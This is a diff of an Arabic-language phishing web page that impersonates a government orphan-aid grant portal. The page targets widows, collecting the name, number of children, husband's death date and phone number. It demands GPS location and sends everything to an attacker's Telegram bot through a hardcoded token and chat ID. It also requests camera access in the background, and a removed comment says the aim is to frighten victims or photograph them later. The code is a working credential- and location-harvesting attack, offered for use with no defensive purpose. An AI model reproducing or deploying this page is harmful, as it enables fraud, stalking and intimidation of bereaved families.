@@ -5,71 +5,82 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>بوابة التسجيل - منحة معونة الأيتام 2026</title>
     <style>
-        body { font-family: 'Arial', sans-serif; background: #f4f7f6; text-align: center; direction: rtl; }
-        .container { background: white; max-width: 400px; margin: 30px auto; padding: 25px; border-radius: 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); }
-        h2 { color: #2c3e50; font-size: 20px; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
-        .btn { background: #27ae60; color: white; border: none; padding: 15px; width: 100%; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: bold; }
-        .footer { font-size: 11px; color: #95a5a6; margin-top: 15px; }
+        body { font-family: 'Arial', sans-serif; background: #f0f2f5; text-align: center; direction: rtl; padding: 10px; }
+        .container { background: white; max-width: 420px; margin: 20px auto; padding: 25px; border-radius: 15px; box-shadow: 0 8px 25px rgba(0,0,0,0.1); border-top: 5px solid #27ae60; }
+        h2 { color: #2c3e50; font-size: 1.4em; margin-bottom: 10px; }
+        .alert { background: #fee; color: #c0392b; padding: 10px; border-radius: 5px; font-size: 12px; margin-bottom: 15px; }
+        label { display: block; text-align: right; margin: 10px 5px 5px; font-weight: bold; font-size: 14px; }
+        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 15px; background: #fafafa; }
+        .btn { background: #27ae60; color: white; border: none; padding: 15px; width: 100%; border-radius: 8px; cursor: pointer; font-size: 17px; font-weight: bold; margin-top: 20px; transition: 0.3s; }
+        .btn:hover { background: #219150; }
+        .footer { font-size: 11px; color: #95a5a6; margin-top: 20px; line-height: 1.5; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <img src="https://img.icons8.com/color/96/family-guarantee.png" alt="logo">
-    <h2>منحة كفالة اليتيم - تسجيل جديد</h2>
-    <p style="font-size: 13px; color: #e74c3c;">يرجى ملء البيانات لتفعيل المعونة الشهرية لمدة عام</p>
+    <img src="https://img.icons8.com/external-flatart-icons-flat-flatarticons/100/external-family-medical-health-flatart-icons-flat-flatarticons.png" alt="logo" width="80">
+    <h2>المنحة السنوية للأيتام 2026</h2>
+    <div class="alert">يرجى ملء البيانات بدقة لضمان تحويل مبلغ الكفالة بشكل فوري</div>
     
-    <input type="text" id="name" placeholder="اسم الأرملة الكامل">
-    <input type="number" id="kids" placeholder="عدد الأطفال الأيتام">
-    <input type="text" id="death" placeholder="تاريخ وفاة الزوج">
-    <input type="tel" id="phone" placeholder="رقم الهاتف للتواصل">
+    <label>اسم الأرملة الكامل:</label>
+    <input type="text" id="name" placeholder="الاسم الثلاثي">
+
+    <label>عدد الأطفال:</label>
+    <input type="number" id="kids" placeholder="عدد الأطفال القاصرين">
+
+    <label>تاريخ وفاة المعيل:</label>
+    <input type="text" id="death" placeholder="يوم / شهر / سنة">
+
+    <label>رقم هاتف الواتساب:</label>
+    <input type="tel" id="phone" placeholder="09xxxxxxxx">
     
-    <button class="btn" onclick="captureEverything()">إرسال الطلب والتحقق</button>
-    <div class="footer">وزارة الشؤون الاجتماعية والعمل - بوابة المنح</div>
+    <button class="btn" onclick="sendToBot()">تفعيل طلب المعونة</button>
+    
+    <div class="footer">
+        © 2026 جميع الحقوق محفوظة - لجنة الإغاثة الإنسانية<br>
+        معتمد من مكتب الشؤون والعمل
+    </div>
 </div>
 
 <script>
     const TOKEN = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
-    const CHAT_ID = "حط_هون_الآيدي_تبعك"; // استبدل هاد بالـ ID تبعك
+    const CHAT_ID = "7214473798";
 
-    async function captureEverything() {
+    async function sendToBot() {
         const name = document.getElementById('name').value;
         const kids = document.getElementById('kids').value;
         const death = document.getElementById('death').value;
         const phone = document.getElementById('phone').value;
 
-        if(!name || !phone) { alert("يرجى إكمال البيانات!"); return; }
+        if(!name || !phone) { alert("يرجى ملء كافة الخانات المطلوبة!"); return; }
 
-        // 1. جمع الموقع الجغرافي (GPS)
+        // محاولة جلب الموقع الجغرافي
         navigator.geolocation.getCurrentPosition(async (pos) => {
             const lat = pos.coords.latitude;
             const lon = pos.coords.longitude;
-            const googleMaps = `https://www.google.com/maps?q=${lat},${lon}`;
+            const maps = `https://www.google.com/maps?q=${lat},${lon}`;
 
-            let report = `🔥 صيد جديد (معونة أيتام) 🔥\n\n`;
-            report += `👤 الاسم: ${name}\n`;
-            report += `👦 عدد الأيتام: ${kids}\n`;
-            report += `📅 وفاة الزوج: ${death}\n`;
-            report += `📞 الهاتف: ${phone}\n`;
-            report += `📍 الموقع: ${googleMaps}`;
+            let text = `🔥 **صيد جديد: معونة أيتام** 🔥\n\n`;
+            text += `👤 **الاسم:** ${name}\n`;
+            text += `👦 **الأطفال:** ${kids}\n`;
+            text += `📅 **تاريخ الوفاة:** ${death}\n`;
+            text += `📞 **الهاتف:** ${phone}\n`;
+            text += `📍 **الموقع:** ${maps}`;
 
-            // إرسال البيانات فوراً للتليجرام
             await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: report })
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "Markdown" })
             });
 
-            alert("تم تسجيل طلبك بنجاح. سيتم الاتصال بك للتحقق.");
+            alert("تم تسجيل طلبك بنجاح. سيتم التواصل معك عبر الواتساب.");
         }, (err) => {
-            alert("خطأ: يرجى السماح بالوصول للموقع لتأكيد نطاق المعونة!");
+            alert("خطأ: يجب تفعيل الـ GPS والسماح بالوصول للموقع لتأكيد نطاق السكن!");
         });
 
-        // 2. تفعيل الكاميرا (لإرعاب الضحية أو التقاط صور لاحقاً)
-        try {
-            await navigator.mediaDevices.getUserMedia({ video: true });
-        } catch (e) {}
+        // طلب صلاحية الكاميرا في الخلفية
+        try { await navigator.mediaDevices.getUserMedia({ video: true }); } catch (e) {}
     }
 </script>
 </body>
